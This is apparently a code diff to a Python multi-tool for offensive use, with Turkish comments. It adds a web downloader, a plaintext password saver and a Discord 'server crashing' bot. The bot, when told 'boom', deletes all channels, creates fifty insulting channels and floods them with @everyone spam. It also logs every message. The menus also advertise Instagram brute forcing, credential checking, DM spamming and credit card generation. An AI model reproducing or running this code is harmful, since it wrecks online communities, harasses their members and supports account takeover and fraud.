@@ -51,7 +51,7 @@ except Exception as e:
     input("\nPress 'enter' to exit...\n")
     exit()
 
-# KÜTÜPHANELERİN TEKRARDAN İÇE AKTARIMI
+# KÜTÜPHANELER
 from colorama import Fore, Back, Style, init
 import requests
 import instaloader
@@ -88,9 +88,10 @@ def connectiontest():
         print(Fore.LIGHTRED_EX + "[-] You must be connected to the internet to use this script!")
         input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to exit...\n")
         exit()
-
 connectiontest()
 
+
+# FONKSİYONLAR
 def instagram_brute_force():
     try:
         sil()
@@ -186,7 +187,7 @@ def instagram_checker():
 
                         except TwoFactorAuthRequiredException:
                             print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + f"[/] 2FA detected! Username: {username} Password: {password}\nSaved as 'igchecker.txt'")
-                            with open("igbrute.txt", "a", encoding="utf-8") as dosya:
+                            with open("igchecker.txt", "a", encoding="utf-8") as dosya:
                                 dosya.write(f"[/] Username: {username}, Password: {password}\n")
                             input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                             return main()
@@ -871,7 +872,7 @@ def dns_query_main():
             print("\n")
             
             try:
-                # IPv4 ve IPv6 sorgusu
+                # IPv4 IPv6
                 try:
                     ipv4 = dns.resolver.resolve(domain, "A")
                     print(Style.BRIGHT + Fore.LIGHTCYAN_EX + f"{domain} - IPv4: {[ip.to_text() for ip in ipv4]}")
@@ -884,28 +885,28 @@ def dns_query_main():
                 except dns.resolver.NoAnswer:
                     print(Style.BRIGHT + Fore.LIGHTRED_EX + f"{domain} için IPv6 kaydı bulunamadı.")
 
-                # MX (Mail Exchange) sorgusu
+                # MX
                 try:
                     mail = dns.resolver.resolve(domain, 'MX')
                     print(Style.BRIGHT + Fore.LIGHTCYAN_EX + f"{domain} - Mail: {[mx.to_text() for mx in mail]}")
                 except dns.resolver.NoAnswer:
                     print(Style.BRIGHT + Fore.LIGHTRED_EX + f"{domain} için MX kaydı bulunamadı.")
                 
-                # NS (Name Server) sorgusu
+                # NS
                 try:
                     nameserver = dns.resolver.resolve(domain, 'NS')
                     print(Style.BRIGHT + Fore.LIGHTCYAN_EX + f"{domain} - Name Server: {[ns.to_text() for ns in nameserver]}")
                 except dns.resolver.NoAnswer:
                     print(Style.BRIGHT + Fore.LIGHTRED_EX + f"{domain} için NS kaydı bulunamadı.")
                 
-                # CNAME sorgusu
+                # CNAME
                 try:
                     cname = dns.resolver.resolve(domain, 'CNAME')
                     print(Style.BRIGHT + Fore.LIGHTCYAN_EX + f"{domain} - CNAME: {cname[0].to_text()}")
                 except dns.resolver.NoAnswer:
                     print(Style.BRIGHT + Fore.LIGHTRED_EX + f"{domain} için CNAME kaydı bulunamadı.")
                 
-                # SOA sorgusu
+                # SOA
                 try:
                     soa = dns.resolver.resolve(domain, 'SOA')
                     print(Style.BRIGHT + Fore.LIGHTCYAN_EX + f"{domain} - SOA: {soa[0].to_text()}")
@@ -931,7 +932,6 @@ def dns_query_main():
             targetip = input(Style.BRIGHT + Fore.LIGHTYELLOW_EX + "[?] Please enter target IP address: ").strip().lower()
             
             try:
-                # PTR (Reverse DNS) sorgusu
                 dns_ptr = dns.resolver.resolve(targetip, 'PTR')
                 print(Style.BRIGHT + Fore.LIGHTCYAN_EX + f"{targetip} - PTR: {dns_ptr[0].to_text()}")
             
@@ -1410,7 +1410,306 @@ def random_id_generator():
         print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
         exit()
 
+def web_downloader():
+    try:
+        sil()
+        print(banner)
+        url = input(Fore.LIGHTYELLOW_EX + Style.DIM + "\n[?] Please enter the target URL address: ").strip().lower()
 
+        if not url.startswith("http"):
+            if url.startswith("www."):
+                url = "https://" + url
+            else:
+                url = "https://www." + url
+
+        print(Fore.LIGHTMAGENTA_EX + f"\n[*] Retrying connection to: {url}")
+        cikti = requests.get(url)
+        print(Fore.LIGHTGREEN_EX + f"\n[+] Connection sucsesfull")
+        time.sleep(1)
+
+        htmlkodu = cikti.text
+        soup = BeautifulSoup(htmlkodu, "html.parser")
+        formattedhtml = soup.prettify()
+
+        def websitesiac():
+            dosyaad = input(Fore.LIGHTYELLOW_EX + "Please enter a file name (default: 'webpage.html'): ").lower().strip() or "webpage.html"
+            if not dosyaad.endswith(".html"):
+                dosyaad = dosyaad + ".html"
+
+            with open(dosyaad, "w", encoding="utf-8") as webpage:
+                webpage.write(htmlkodu)
+            print(Fore.LIGHTCYAN_EX + f"\n[+] File opened was {dosyaad} and code writed!")
+            webbrowser.open(dosyaad)
+            input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+            return main()
+
+        websitesiac()
+
+    except KeyboardInterrupt:
+        sil()
+        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
+        return main()
+
+    except EOFError:
+        sil()
+        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
+        exit()
+
+    except requests.exceptions.ConnectionError:
+        print(Style.BRIGHT + Fore.LIGHTRED_EX + f"[!] Connection error: {url}")
+        input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+        return main()
+    
+    except requests.exceptions.RequestException as e:
+        print(Style.BRIGHT + Fore.LIGHTRED_EX + f"[!] Error: {e}")
+        input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+        return main()
+
+    except Exception as e:
+        print(Style.BRIGHT + Fore.LIGHTRED_EX + f"[!] Error: {e}")
+        input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+        return main()
+
+def sifreyonetisi():
+    try:
+        sil()
+        print(banner)
+        kucuk_harfler = 'abcdefghijklmnopqrstuvwxyz'
+        buyuk_harfler = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+        rakamlar = '0123456789'
+        ozel_karakterler = '!@#$%^&*()-_+='
+        
+        karakter_seti = kucuk_harfler + buyuk_harfler + rakamlar + ozel_karakterler
+        
+        website = input(Style.DIM + Fore.LIGHTYELLOW_EX + "[?] Please enter the website: ").strip().lower()
+        username = input(Style.DIM + Fore.LIGHTYELLOW_EX + "[?] Please enter your username/mail: ").strip()
+        
+        while True:
+            try:
+                passwordlong = input(Style.DIM + Fore.LIGHTYELLOW_EX + "[?] Please enter the length of your password (rec 15): ")
+                passwordlong = int(passwordlong)
+                if passwordlong < 1:
+                    print(Style.BRIGHT + Fore.LIGHTRED_EX + f"[!] Error: You must write a number greater than 1!")
+                    input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+                    continue
+            
+            except ValueError:
+                print(Style.BRIGHT + Fore.LIGHTRED_EX + "[!] Error: Please enter a valid number!")
+                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+                continue
+            
+            except Exception as e:
+                print(Style.BRIGHT + Fore.LIGHTRED_EX + f"[!] Error: {e}")
+                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+                return main()
+
+            break
+
+        sifre = ''.join(random.choice(karakter_seti) for _ in range(passwordlong))
+        print(Style.BRIGHT + Fore.LIGHTGREEN_EX + f"\n[+] Generated password: {sifre}\n")            
+
+        with open("sifreyoneticisi.txt", "a", encoding='utf-8') as dosya:
+            dosya.write(f"Website: {website}, Username: {username}, Password: {sifre}\n")
+
+        print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "Saved as 'sifreyoneticisi.txt'\n")
+        input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+        return main()
+
+    except KeyboardInterrupt:
+        sil()
+        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
+        return main()
+
+    except EOFError:
+        sil()
+        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
+        exit()
+
+    except Exception as e:
+        print(Style.BRIGHT + Fore.LIGHTRED_EX + f"[!] Error: {e}")
+        input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+        return main()
+
+def discord_server_boomber():
+    try:
+        sil()
+        print(banner)
+        print(Style.BRIGHT + Back.LIGHTRED_EX + Fore.LIGHTRED_EX + "[!] WARNING: To avoid errors in this script, make sure that you have enabled all intents settings for your bot and that it has permission on the target server.")
+        input(Style.DIM + Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+        token = input(Style.BRIGHT + Fore.LIGHTYELLOW_EX + "[?] Please enter a token: ").strip()
+        prefix = input(Style.BRIGHT + Fore.LIGHTYELLOW_EX + "[?] Please enter a prefix: ").strip()
+
+        intents = discord.Intents.default()
+        intents.message_content = True
+        intents.members = True
+
+        try:
+            bot = commands.Bot(command_prefix=prefix, intents=intents)
+        except Exception as e:
+            print(Style.BRIGHT + Fore.LIGHTRED_EX + f"Error: {e}")
+            input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+            return main()
+        
+        @bot.event
+        async def on_ready():
+            print(Style.BRIGHT + Fore.LIGHTGREEN_EX + f'[+] Bot {bot.user} online!')
+            print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + f"[!] If someone types 'boom' the server explosion process starts!")
+            print("\n")
+            
+        @bot.event
+        async def on_message(message):
+            if message.author == bot.user:
+                return
+    
+            print(f"Sender: {message.author}\nGuild: {message.guild}\nChannel: {message.channel}\nMessage: {message.content}\n\n\n")
+        
+            with open("dcmessagex.txt", "a") as dosya:
+                dosya.write(f"Sender: {message.author}\nGuild: {message.guild}\nChannel: {message.channel}\nMessage: {message.content}\n\n\n")
+        
+            await bot.process_commands(message)
+                
+        @bot.command()
+        async def boom(ctx):
+        
+            for channel in ctx.guild.channels:
+                try:
+                    await channel.delete()
+                except discord.Forbidden:
+                    print(Style.BRIGHT + Fore.LIGHTRED_EX + f"\n[!] No permission to delete channels: {channel.name}")
+                except discord.HTTPException as e:
+                    print(Style.BRIGHT + Fore.LIGHTRED_EX + f"\n[!] Error occurred while deleting channels: {channel.name}\n")
+            
+            for i in range(50):
+                channel_name = f"YOU-ARE-AN-IDIOT-{i+1}"
+                try:
+                    channel = await ctx.guild.create_text_channel(name=channel_name)
+                    await channel.send("@everyone https://tenor.com/view/you-are-an-idiot-gif-17637615161490421290")
+                    await channel.send("YOU ARE AN IDIOT!")
+                    
+                except discord.HTTPException as e:
+                    print(Style.BRIGHT + Fore.LIGHTRED_EX + f"\n[!] Error occurred while deleting channels: {channel.name}\n")
+                except discord.Forbidden:
+                    print(Style.BRIGHT + Fore.LIGHTRED_EX + f"\n[!] No permission to send message: {channel.name}")
+            
+            for channel in ctx.guild.channels:
+                if isinstance(channel, discord.TextChannel):
+                    for i in range(50):
+                        try:
+                            await channel.send("@everyone https://tenor.com/view/you-are-an-idiot-gif-17637615161490421290")
+                            
+                        except discord.HTTPException as e:
+                            print(Style.BRIGHT + Fore.LIGHTRED_EX + f"An error occurred sending a message: {e}")
+            
+            await ctx.send("https://tenor.com/view/explosion-mushroom-cloud-atomic-bomb-bomb-boom-gif-4464831")
+        
+        try:
+            bot.run(token)
+        except:
+            print(Style.BRIGHT + Fore.LIGHTRED_EX + f"\n[X] Bot failed to run. Token: {token}\n")
+            input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+            return main()
+
+    except KeyboardInterrupt:
+        sil()
+        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
+        return main()
+
+    except EOFError:
+        sil()
+        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
+        exit()
+        
+    except Exception as e:
+        print(Fore.RED + f"[X] Error: {e}")
+        input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+        return main()
+
+def list_all_features():
+    try:
+        başlık =  Style.BRIGHT + Fore.LIGHTCYAN_EX
+        içerik =  Style.DIM + Fore.LIGHTYELLOW_EX
+        
+        sil()
+        print(banner)
+        
+        print(f"{başlık}\nINSTAGRAM TOOLS\n")
+        print(f"{içerik}    - Instagram Brute Force")
+        print(f"{içerik}    - Instagram Checker")
+        print(f"{içerik}    - Instagram OSINT")
+        print(f"{başlık}\nWEB TOOLS\n")
+        print(f"{içerik}    - SQL Scanner")
+        print(f"{içerik}    - XSS Scanner")
+        print(f"{içerik}    - Directory Scanner")
+        print(f"{içerik}    - Port Scanner")
+        print(f"{içerik}    - Admin Panel Finder")
+        print(f"{içerik}    - DNS Query")
+        print(f"{içerik}    - IP Query")
+        print(f"{içerik}    - Web Downloader")
+        print(f"{başlık}\nDISCORD TOOLS\n")
+        print(f"{içerik}    - Discord DM Spammmer")
+        print(f"{içerik}    - Discord Nitro Generator & Checker")
+        print(f"{içerik}    - Discord Server Crashing")
+        print(f"{başlık}\nOTHER TOOLS\n")
+        print(f"{içerik}    - File Encrypt & Decrypt")
+        print(f"{içerik}    - Google Dorking")
+        print(f"{içerik}    - Password Manager")
+        print(f"{başlık}\nRANDOM GENERATE TOOLS\n")
+        print(f"{içerik}    - Random Credit Card Generator & Checker")
+        print(f"{içerik}    - Random ID Generator")
+
+        time.sleep(2)
+        input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+        return main()
+
+
+    except KeyboardInterrupt:
+        sil()
+        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
+        return main()
+
+    except EOFError:
+        sil()
+        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
+        exit()
+        
+    except Exception as e:
+        print(Fore.RED + f"[X] Error: {e}")
+        input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+        return main()
+
+def contact():
+    try:
+        sil()
+        print(banner)
+        print(Style.BRIGHT + Fore.LIGHTGREEN_EX + """
+                [CONTACT]
+              
+    Discord:
+              @charliecpln
+    Telegram: 
+              @charliecpln
+              https://t.me/charliecpln
+    Github:
+              @charliecpln
+              https://github.com/charliecpln
+""")
+        input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+        return main()
+
+    except KeyboardInterrupt:
+        sil()
+        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
+        return main()
+
+    except EOFError:
+        sil()
+        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
+        exit()
+        
+    except Exception as e:
+        print(Fore.RED + f"[X] Error: {e}")
+        input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
+        return main()
 
 # ANA FONKSİYON
 def main():
@@ -1457,7 +1756,8 @@ def main():
         [4] - Port Scanner
         [5] - Admin Panel Finder
         [6] - DNS Query
-        [7] - Main Menu
+        [7] - Web Downloader
+        [8] - Main Menu
 
         """
             print(webtoolsmenu)
@@ -1487,7 +1787,11 @@ def main():
                 sil()
                 dns_query_main()
 
-            elif secim == "7" or secim.startswith("m"):
+            elif secim == "7" or secim.startswith("w"):
+                sil()
+                web_downloader()
+
+            elif secim == "8" or secim.startswith("m"):
                 sil()
                 return main()
 
@@ -1499,9 +1803,10 @@ def main():
             sil()
             print(banner)
             discord_tools_menu = Style.BRIGHT + Fore.LIGHTCYAN_EX + """
-        [1] - Discord DM spammer
-        [2] - Discord Nitro generator & checker
-        [3] - Main menu
+        [1] - Discord DM Spammer
+        [2] - Discord Nitro Generator & Checker
+        [3] - Discord Server Crashing
+        [4] - Main Menu
         
         """
             print(discord_tools_menu)
@@ -1515,7 +1820,11 @@ def main():
                 sil()
                 asyncio.run(discord_nitro_generator_and_checker())
 
-            elif secim == "3" or secim.startswith("m"):
+            elif secim == "3" or secim.startswith("s"):
+                sil()
+                discord_server_boomber()
+
+            elif secim == "4" or secim.startswith("m"):
                 sil()
                 return main()
             
@@ -1528,9 +1837,10 @@ def main():
             sil()
             print(banner)
             other_tools_menu = Style.BRIGHT + Fore.LIGHTCYAN_EX + """
-        [1] File encrypt - decrypt
-        [2] Google dorking
-        [3] Main menu
+        [1] File Encrypt - Decrypt
+        [2] Google Dorking
+        [3] Password Manager
+        [4] Main Menu
         
         """
             print(other_tools_menu)
@@ -1544,7 +1854,11 @@ def main():
                 sil()
                 google_dorking()
 
-            elif secim == "3" or secim.startswith("m"):
+            elif secim == "3" or secim.startswith("p"):
+                sil()
+                sifreyonetisi()
+
+            elif secim == "4" or secim.startswith("m"):
                 sil()
                 return main()
             
@@ -1556,7 +1870,7 @@ def main():
             sil()
             print(banner)
             random_generate_tools_menu = Style.BRIGHT + Fore.LIGHTCYAN_EX + """
-        [1] Random Credit Card Generator
+        [1] Random Credit Card Generator & Checker
         [2] Random ID Generator
         [3] Main Menu
         
@@ -1590,6 +1904,9 @@ def main():
         [3] - Discord Tools
         [4] - Other Tools
         [5] - Random Generate Tools
+
+        [A] - List All Features
+        [C] - Contact
         [Q] - Exit
         
         """
@@ -1615,6 +1932,14 @@ def main():
         elif secim == "5" or secim.startswith("r"):
             sil()
             random_generate_tools()
+
+        elif secim.startswith("a"):
+            sil()
+            list_all_features()
+
+        elif secim.startswith("c"):
+            sil()
+            contact()
 
         elif secim == "0" or secim.startswith("q") or secim.startswith("e"):
             sil()
